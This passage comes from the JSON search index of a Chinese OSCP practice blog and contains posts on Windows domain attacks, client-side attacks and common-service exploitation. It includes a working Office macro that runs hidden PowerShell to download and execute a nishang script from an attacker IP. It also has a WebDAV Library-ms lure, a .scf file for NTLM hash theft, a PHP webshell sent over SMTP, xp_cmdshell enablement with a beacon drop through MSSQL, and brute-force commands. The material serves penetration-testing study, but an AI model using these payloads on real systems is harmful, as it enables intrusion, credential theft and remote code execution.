id=\"组合拳winpeassmimikatz信息检索linuxpeass枚举服务暴力破解\"\u003e组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解\u003c/h1\u003e\n\u003cp\u003e同步ntp时间：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo ntpdate -s 10.10.10.24\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看是否在域内：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enet time /do\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"一ntlm协议\"\u003e一、NTLM协议\u003c/h2\u003e\n\u003ch3 id=\"1lm-hash算法\"\u003e1、LM hash算法\u003c/h3\u003e\n\u003cp\u003e简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。\u003c/p\u003e\n\u003ch3 id=\"2ntlm-hash算法\"\u003e2、NTLM hash算法\u003c/h3\u003e\n\u003cp\u003e简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中\u003c/p\u003e\n\u003ch3 id=\"3ntlm-协议认证\"\u003e3、NTLM 协议认证\u003c/h3\u003e\n\u003cp\u003e简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。\u003c/p\u003e\n\u003cp\u003echallenge值：\nV1：8B\nV2：16B\nNet-Ntlm hash:\nV1：DES加密算法\nV2：HMAC-MD5加密算法\u003c/p\u003e\n\u003ch3 id=\"4攻击方式\"\u003e4、攻击方式\u003c/h3\u003e\n\u003cp\u003e基于以上特性，NTLM主要有三种攻击方式：\n1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。\n2、NET-NTLM Relay，发生在response中。\n3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。\u003c/p\u003e\n\u003ch2 id=\"二kerberos协议\"\u003e二、Kerberos协议\u003c/h2\u003e\n\u003ch2 id=\"1基础\"\u003e1、基础\u003c/h2\u003e\n\u003cp\u003e①客户端\n②服务端，拥有唯一的SPN（服务主体名称）\n③认证服务的KDC（密钥分发中心），服务账户为krbtgt。\u003c/p\u003e\n\u003cp\u003e简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ\u0026amp;AS_REP和TGS_REQ\u0026amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。\u003c/p\u003e","title":"域渗透操作"},{"content":"宏 后缀建议为doc或者docm\n宏攻击代码：\nSub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() Dim Str As String Str = Str + \u0026#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY\u0026#34; Str = Str + \u0026#34;3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5\u0026#34; Str = Str + \u0026#34;nKGh0dHA6Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKC\u0026#34; Str = Str + \u0026#34;g==\u0026#34; CreateObject(\u0026#34;Wscript.Shell\u0026#34;).Run Str End Sub 字符串base64编码内容： 配合nishang:\niex(new-object net.webclient).downloadstring(\u0026#34;http://192.168.45.240/nishang.ps1\u0026#34;) IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;) echo \u0026#39;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;) \u0026#39;|base64 py脚本分割：\nstr = \u0026#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGh0dHA6 Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKCg==\u0026#34; n = 50 for i in range(0, len(str), n): print(\u0026#34;Str = Str + \u0026#34; + \u0026#39;\u0026#34;\u0026#39; + str[i:i+n] + \u0026#39;\u0026#34;\u0026#39;) 如果base64不行，不如直接明文：\nSub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() Dim Str As String Str = \u0026#34;powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;)\u0026#34; CreateObject(\u0026#34;Wscript.Shell\u0026#34;).Run Str End Sub powershell.exe -nop -noni -w hidden -exec bypass -enc\n库文件 1、开启webdav服务：\n安装 pip3 install wsgidav 创建一个文件夹，然后运行： /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ 2、创建库文件\n文件名：config.Library-ms\n修改URL就好：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;http://schemas.microsoft.com/windows/2009/library\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;6\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;http://192.168.45.227\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;http://schemas.microsoft.com/windows/2009/library\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;6\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;cr\u0026gt;\u0026lt;url\u0026gt;http://192.168.45.227\u0026lt;/url\u0026gt;\u0026lt;/cr\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt; 3、在wevdav下面放一个快捷方式\n名字随便就好，这里是automatic_configuration，引诱点击即可：\n内容为powershell一句话上线：\npowershell.exe -c \u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.197:81/nishang.ps1\u0026#39;) 第二种方式 https://github.com/xct/hashgrab\npython3 hashgrab.py \u0026lt;ip\u0026gt; \u0026lt;output\u0026gt; sudo responder -i 192.168.45.197 -I tun0 .lnk文件 ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/","summary":"\u003ch1 id=\"宏\"\u003e宏\u003c/h1\u003e\n\u003cp\u003e后缀建议为doc或者docm\u003c/p\u003e\n\u003cp\u003e宏攻击代码：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n    \n     Str = Str + \u0026#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY\u0026#34;\n     Str = Str + \u0026#34;3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5\u0026#34;\n     Str = Str + \u0026#34;nKGh0dHA6Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKC\u0026#34;\n     Str = Str + \u0026#34;g==\u0026#34;\n\n    CreateObject(\u0026#34;Wscript.Shell\u0026#34;).Run Str\nEnd Sub\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e字符串base64编码内容：\n配合nishang:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eiex(new-object net.webclient).downloadstring(\u0026#34;http://192.168.45.240/nishang.ps1\u0026#34;)\n\nIEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;)\n\necho \u0026#39;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;)\n\u0026#39;|base64\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003epy脚本分割：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estr = \u0026#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGh0dHA6\nLy8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKCg==\u0026#34;\n\nn = 50\n\nfor i in range(0, len(str), n):\n\tprint(\u0026#34;Str = Str + \u0026#34; + \u0026#39;\u0026#34;\u0026#39; + str[i:i+n] + \u0026#39;\u0026#34;\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果base64不行，不如直接明文：\u003c/p\u003e","title":"客户端攻击"},{"content":"渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：\nNFS 挂载： sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage showmount -d：仅显示已被NFS客户端加载的目录； -e：显示NFS服务器上所有的共享目录。 SSH 爆破 medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定 crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法 ./cme -t 1 ssh hosts -u use_user -p pass hydra -L txt -P txt ip ssh 快 生成ssh公私钥 ssh-keygen -t rsa 上传文件名必须为：authorized_keys 连接问题 vim ~/.ssh/config HostKeyAlgorithms +ssh-rsa PubkeyAcceptedKeyTypes +ssh-rsa FTP ftp anonymous@ip prompt off 切换传输模式： binary ascii 开关被动模式： passive put get mget SMB 列出信息： smbclient -L \\\\\\\\{TARGET_IP}\\\\ -U 用户名 连接： smbclient //ip/目录 SMB扫描工具： enum4linux -a -o ip 挂载SMB： mount -t cifs //\u0026lt;IP地址\u0026gt; 本地目录 sudo mount -t cifs -o username=\u0026#34;qiu\u0026#34;,password=\u0026#34;password\u0026#34; //192.168.5.103/qiu smb 匿名挂载： sudo mount -t cifs -o rw,username=guest,password= \u0026#39;//10.10.10.103/Department Shares\u0026#39; smb SMB罗列： smbmap -r 目录 -H ip 批量下载不用确认： prompt off 使用Kerberos协议登录smb: 在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py： python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168 完全限定域名获取方式： https://github.com/CroweCybersecurity/ad-ldap-enum.git python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 或者使用get-tgt获取票据，然后修改环境变量： sudo ntpdate -s 10.10.10.24 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip 10.10.11.181 export KRB5CCNAME=svc_smb.ccache 爆破： hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip enum4linux enum4linux -a -o www.harvard.edu 确定目录可写入： 先挂载在本地：\n#!/bin/bash list=$(find /mnt -type d) for d in $list do touch $d/x 2\u0026gt;/dev/null if [ $? -eq 0 ] then echo $d \u0026#34; is writable\u0026#34; fi done relay打法，当有目录可写入时可尝试：\n当用户浏览共享时，将自动建立从其系统到 SCF 文件中包含的 UNC 路径的连接。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。\n.scf是Windows 资源管理器用户访问该文件的目录时打开SMB连接会触发NTLM认证从而获取NET-NETLM HASH pwn.scf文件内容如下\n[Shell] Command=2 IconFile=\\\\10.10.16.8\\share\\pwn.ico [Taskbar] Command=ToggleDesktop nmap smb信息获取：\nls -1 /usr/share/nmap/scripts/smb* smb 命令行操作 开启smb共享：\nhttps://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB . .\\Invoke-BuildAnonymousSMBServer.ps1 Invoke-BuildAnonymousSMBServer -Path c:\\inetpub\\wwwroot -Mode Enable 0x04 通过命令行开启可匿名访问的文件共享服务器 具体方法对应的命令如下： 1.启用Guest用户 net user guest /active:yes 2.将Everyone权限应用于匿名用户 REG ADD \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Lsa\u0026#34; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f 3.指定匿名共享文件的位置 REG ADD \u0026#34;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\u0026#34; /v NullSessionShares /t REG_MULTI_SZ /d smb /f 4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除 导出组策略： secedit /export /cfg gp.inf /quiet 修改文件gp.inf，将SeDenyNetworkLogonRight = Guest修改为SeDenyNetworkLogonRight =，保存 重新导入组策略： secedit /configure /db gp.sdb /cfg gp.inf /quiet 强制刷新组策略，立即生效(否则，重启后生效)： gpupdate/force 5.设置文件共享 icacls c:\\Windows\\System32\\spool\\drivers\\color\\ /T /grant Everyone:r net share share=c:\\Windows\\System32\\spool\\drivers\\color\\ /grant:everyone,full 至此，可匿名访问的文件共享服务器开启成功，访问的地址为//\u0026lt;ip\u0026gt;/smb net use M: \\\\10.10.125.147\\share /user:smbuser password dir M:\\ MSSQL 连接\nimpacket中的mssqlclient.py 命令： python3 mssqlclient.py domain\\username:password@ip -windows-auth 使用票据登录： export KRB5CCNAME=/home/kali/Desktop/HTB/Scrambled/administrator.ccache mssqlclient.py -k dc1.scrm.local （注意网上下载的可能会无反应） 使用pip安装后尝试： pip install --upgrade impacket 基础语法：\n查询数据库： SELECT name FROM master..sysdatabases; 使用数据库： use xx; 查询表： SELECT name FROM sysobjects WHERE xtype = \u0026#39;U\u0026#39;; 查询数据： select * from orcharddb.dbo.blog_Orchard_Users_UserPartRecord; relay:\nEXEC MASTER.sys.xp_dirtree \u0026#39;\\\\10.10.14.14\\test\u0026#39;, 1, 1 抓的hash可以直接用john破解 john --wordlist=/xx/xx hash.txt xp_cmd EXEC sp_configure \u0026#39;Show Advanced Options\u0026#39;, 1; //允许修改高级参数 reconfigure; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; 开启xp_cmd RECONFIGURE; xp_cmdshell \u0026#34;whoami\u0026#34;; 文件落地： xxd -ps beacon.exe hex.txt DECLARE @DATA VARBINARY(MAX) = 0x-hex DECLARE @filepath VARCHAR(MAX) = \u0026#39;C:\\\\Windows\\\\temp\\\\cs.exe\u0026#39; DECLARE @ObjectToken INT EXEC sp_OACreate \u0026#39;ADODB.Stream\u0026#39;, @ObjectToken OUTPUT EXEC sp_OASetProperty @ObjectToken, \u0026#39;Type\u0026#39;, 1 EXEC sp_OAMethod @ObjectToken, \u0026#39;Open\u0026#39; EXEC sp_OAMethod @ObjectToken, \u0026#39;Write\u0026#39;, NULL, @DATA EXEC sp_OAMethod @ObjectToken, \u0026#39;SaveToFile\u0026#39;, NULL, @filepath, 2 EXEC sp_OAMethod @ObjectToken, \u0026#39;Close\u0026#39; EXEC sp_OADestroy @ObjectToken SELECT @filepath mongodb 连接：mongo ip 查看db:show dbs 使用数据库：use 数据库名 查看集合：show collections; 查看集合内容：db.【collection】.find() 枚举数据库中的用户： mongo --port 端口 数据库名称 --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; 更新数据库内容： mongo --port 27117 ace --eval \u0026#39;db.admin.update({\u0026#34;_id\u0026#34;:ObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;)},{$set:{\u0026#34;x_shadow\u0026#34;:\u0026#34;$6$jK3CUz9Ttn4yAf6z$P22Obhi4D4e045xvD4GukfQ6Icrp78/ICMFBnGJyxoS6dUjMYZMZDyosLHtleSdzHbAlbuNciW2tS4kIfUglp.\u0026#34;}})\u0026#39; PostgreSQL 连接： psql -U 用户名 -h IP -p 端口 列出数据库： \\list 使用数据库： \\c 数据库名称 列出数据库表： \\dt 查询还是select: select * from table; RSYNC 列出可用文件： rsync --list-only {target_IP}:: 复制文件到本地 rsync {target_IP}::public/flag.txt flag.txt TFTP服务 tftp ip port 不支持列出文件，只支持上传下载，多数利用情况下，可以通过其他方式获得显示 get put POP3 110 邮箱服务可爆破或者登录，爆破使用hydra:\nhydra -L username -P passwd ip pop3 登录可使用thunderbird或者NC：\nnc 10.10.10.4 110 user seina 用户 pass scoobydoo2 密码 list 列出邮件 retr 1 查看邮件 SMTP 25 nc 192.168.5.108 25 #连接邮件服务器 helo root #标识用户身份 mail from:\u0026#34;ROOT \u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34; #发件人，木马所在地 rcpt to:root #收件人 data #编辑 . #编辑结束 quit #退出nc swaks工具 swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body \u0026#34;http://10.10.16.4/\u0026#34; 发送附件： swaks --to nico@megabank.com --from cxk@cxk --server 10.10.10.77 --body \u0026#34;123\u0026#34; --attach cxk.rtf sendEmail -f mac@megabank.com -t nico@megabank.com -u \u0026#34;Invoice Attached\u0026#34; -m \u0026#34;You are overdue payment\u0026#34; -a cxk.rtf -s 10.10.10.77 -v 解释： - `--to itsupport@outdated.htb`: 指定邮件的接收者地址为 `itsupport@outdated.htb`。 - `--from car@melo`: 指定邮件的发件人地址为 `car@melo`。 - `--server mail.outdated.htb`: 指定SMTP服务器的地址为 `mail.outdated.htb`。 - `--body \u0026#34;http://10.10.16.4/\u0026#34;`: 指定邮件的正文内容为 \u0026#34;http://10.10.16.4/\u0026#34;。这似乎是一个URL，可能是要在邮件正文中包含的链接。 配置账号密码：--auth-user maildmz --auth-password \u0026#34;DPuBT9tGCBrTbR\u0026#34; 枚举，由于存在用户名和没有用户名的返回信息不一致，所以可以枚举：脚本如下，使用方式为name+ip #!/usr/bin/python import socket import sys if len(sys.argv) != 3: print(\u0026#34;Usage: vrfy.py \u0026lt;username\u0026gt; \u0026lt;target_ip\u0026gt;\u0026#34;) sys.exit(0) # Create a Socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Connect to the Server ip = sys.argv[2] connect = s.connect((ip,25)) # Receive the banner banner = s.recv(1024) print(banner) # VRFY a user user = (sys.argv[1]).encode() s.send(b\u0026#39;VRFY \u0026#39; + user + b\u0026#39;\\r\\n\u0026#39;) result = s.recv(1024) print(result) # Close the socket s.close() 枚举用户名：\nnmap --script smtp-enum-users ip WinRM远程管理服务 5985/5986端口 使用证书公私钥登录： evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S 账号密码登录： evil-winrm -i IP -u user -p passwd -S 下载文件： download xxx xxx 使用kerberos登录： sudo pwsh Install-Module -Name PSWSMan -Scope AllUsers Install-WSMan exit sudo pwsh enter-pssession -computername dc1.scrm.local -Credential MiscSvc@SCRM.LOCAL 或者申请证书： export KRB5CCNAME=./out.ccache evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB LDAP leapsearch 用户名密码查询 ldapsearch -h 10.10.10.100 -p 389 -D SVC_TGS@active.htb -w GPPstillStandingStrong2k18 anonymous匿名查询查询基本信息： ldapsearch -x -H ldap://10.10.10.161:389 -u \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -s base namingcontexts 查询域内所有用户名 ldapsearch -x -H ldap://10.10.10.161:389 -u \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=htb,DC=local\u0026#34; \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user))\u0026#34; |grep dn awk: ldapsearch -x -H ldap://192.168.224.122:389 -u \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=hutch,DC=offsec\u0026#34; \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user))\u0026#34; |grep dn |awk -F \u0026#39;CN\u0026#39; \u0026#39;{ print $2 }\u0026#39;|awk -F \u0026#39;=\u0026#39; \u0026#39;{ print $2 }\u0026#39;|awk -F \u0026#39;,\u0026#39; \u0026#39;{ print $1 }\u0026#39; \u0026gt; user1.txt 进阶工具： https://github.com/ropnop/windapsearch.git 安装工具： sudo apt-get install libsasl2-dev python3-dev libldap2-dev libssl-dev python3 -m pip install -r requirements.txt 查询用户： ./windapsearch.py -d cascade.local -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -U --dc-ip 10.10.10.182 awk命令： cat user2.txt|grep @hutch.offsec|awk -F \u0026#39; \u0026#39; \u0026#39;{ print $2 }\u0026#39; 查询用户所有信息： ./windapsearch.py -d cascade.local -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --dc-ip 10.10.10.182 -U --full kerberos协议登录： 1、借用kinit获取票据： 安装：sudo apt-get install krb5-user 配置文件：/etc/krb5.conf：注意大小写 [libdefaults] default_realm = ABSOLUTE.HTB [realms] ABSOLUTE.HTB = { kdc = dc.absolute.htb } [domain_realm] .absolute.htb = ABSOLUTE.HTB 申请： kinit ksimpson（账户） 查看票据： klist 查询，关键是那个-Y GSSAPI ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b \u0026#34;dc=absolute,dc=htb\u0026#34; 如果出现报错，可以尝试：sudo apt install libsasl2-modules-gssapi-mit 安装相关环境： sudo apt-cache search libsasl2 sudo apt-get install libsasl2-modules-gssapi-mit 查询objectSid：白银票据利用 ldapsearch -H ldap://dc1.scrm.local -D \u0026#39;scrm.local\\ksimpson\u0026#39; -w \u0026#39;ksimpson\u0026#39; -Y GSSAPI -b \u0026#34;cn=users,dc=scrm,dc=local\u0026#34; | grep -i \u0026#34;objectSid::\u0026#34; | cut -d \u0026#34;:\u0026#34; -f3 将objectSid转换成sid的脚本： 需要注意的是，后面的-500或者-502 要删除： #!/bin/bash OBJECT_ID=\u0026#34;AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9gEAAA==\u0026#34; #修改这里 G=($(echo -n $OBJECT_ID | base64 -d -i | hexdump -v -e \u0026#39;1/1 \u0026#34; %02X\u0026#34;\u0026#39;)) BESA2=${G[8]}${G[9]}${G[10]}${G[11]} BESA3=${G[12]}${G[13]}${G[14]}${G[15]} BESA4=${G[16]}${G[17]}${G[18]}${G[19]} BESA5=${G[20]}${G[21]}${G[22]}${G[23]} BERID=${G[24]}${G[25]}${G[26]}${G[27]}${G[28]} rustscan LESA1=${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]} LESA2=${BESA2:6:2}${BESA2:4:2}${BESA2:2:2}${BESA2:0:2} LESA3=${BESA3:6:2}${BESA3:4:2}${BESA3:2:2}${BESA3:0:2} LESA4=${BESA4:6:2}${BESA4:4:2}${BESA4:2:2}${BESA4:0:2} LESA5=${BESA5:6:2}${BESA5:4:2}${BESA5:2:2}${BESA5:0:2} LERID=${BERID:6:2}${BERID:4:2}${BERID:2:2}${BERID:0:2} LE_SID_HEX=${LESA1}-${LESA2}-${LESA3}-${LESA4}-${LESA5}-${LERID} # Initial SID value which is used to construct actual SID SID=\u0026#34;S-1\u0026#34; # Convert LE_SID_HEX to decimal values and append it to SID as a string IFS=\u0026#39;-\u0026#39; read -ra ADDR \u0026lt;\u0026lt;\u0026lt; \u0026#34;${LE_SID_HEX}\u0026#34; for OBJECT in \u0026#34;${ADDR[@]}\u0026#34;; do SID=${SID}-$((16#${OBJECT})) done echo ${SID} Redis 连接： redis -h ip 密码存储： C:\\Program Files\\Redis\\redis.windows-service.conf type redis.windows-service.conf | findstr requirepass 查询所有内容： keys * 查询指定内容： get xx RPC 登录RPC： rpcclient -U htb\\\\james mantis.htb.local 获取SID： LOOKUPNAMES james（用户名） 空用户： rpcclient -U \u0026#39;\u0026#39; 10.10.10.248 SNMP UDP 161 主要是软件情况\n前置内容：\n1.3.6.1.2.1.25.1.6.0\t系统进程 1.3.6.1.2.1.25.4.2.1.2\t运行程序 1.3.6.1.2.1.25.4.2.1.4\t进程路径 1.3.6.1.2.1.25.2.3.1.4\t存储单元 1.3.6.1.2.1.25.6.3.1.2\t软件名称 1.3.6.1.4.1.77.1.2.25\t用户帐户 1.3.6.1.2.1.6.13.1.3\tTCP 本地端口\n用于获取信息 snmpwalk -c public -v1 -t 10 192.168.50.151 http://www.phreedom.org/software/onesixtyone/ echo public \u0026gt; community echo private \u0026gt;\u0026gt; community echo manager \u0026gt;\u0026gt; community for ip in $(seq 1 254); do echo 192.168.50.$ip; done \u0026gt; ips kali@kali:~$ onesixtyone -c community -i ips 获取机器账户： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 获取正在运行的程序： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2 获取监听端口： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3 枚举整个MIB树 snmpwalk -c public -v1 -t 10 查看扩展信息： snmpwalk -c public -v1 192.168.200.149 NET-SNMP-EXTEND-MIB::nsExtendObjects 敏感信息获取：\nsudo apt-get install snmp-mibs-downloader NetBIOS 139 用于获取信息，用户信息 sudo nbtscan -r 192.168.50.0/24 一些特殊软件： JDWP - Java Debug Wire Protocol 8000端口 aerospike数据库 3000端口 putty RDP 提权 screen-4.5.0 提权 .git githack ","permalink":"https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/","summary":"\u003cp\u003e渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：\u003c/p\u003e\n\u003ch2 id=\"nfs\"\u003eNFS\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e挂载：\nsudo mount -t nfs 192.168.154.130:/home/user/storage ./storage\n\nshowmount \n-d：仅显示已被NFS客户端加载的目录； \n-e：显示NFS服务器上所有的共享目录。\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ssh\"\u003eSSH\u003c/h2\u003e\n\u003ch3 id=\"爆破\"\u003e爆破\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emedusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定\n\ncrackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法\n\n./cme -t 1 ssh hosts  -u use_user  -p pass \n\nhydra -L txt -P txt ip ssh 快\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"生成ssh公私钥\"\u003e生成ssh公私钥\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003essh-keygen -t rsa\n\n上传文件名必须为：authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"连接问题\"\u003e连接问题\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evim ~/.ssh/config \nHostKeyAlgorithms +ssh-rsa \nPubkeyAcceptedKeyTypes +ssh-rsa\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ftp\"\u003eFTP\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eftp anonymous@ip\n\nprompt off\n\n切换传输模式： binary ascii\n开关被动模式： passive\n\nput \nget\nmget\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"smb\"\u003eSMB\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e列出信息：\nsmbclient -L \\\\\\\\{TARGET_IP}\\\\ -U 用户名\n连接：\nsmbclient //ip/目录\n\nSMB扫描工具：\nenum4linux -a -o ip \n挂载SMB：\nmount -t cifs //\u0026lt;IP地址\u0026gt; 本地目录\nsudo mount -t cifs -o username=\u0026#34;qiu\u0026#34;,password=\u0026#34;password\u0026#34; //192.168.5.103/qiu smb\n\n\n匿名挂载：\nsudo mount -t cifs -o rw,username=guest,password= \u0026#39;//10.10.10.103/Department Shares\u0026#39; smb\n\nSMB罗列：\nsmbmap -r 目录 -H ip\n\n批量下载不用确认：\nprompt 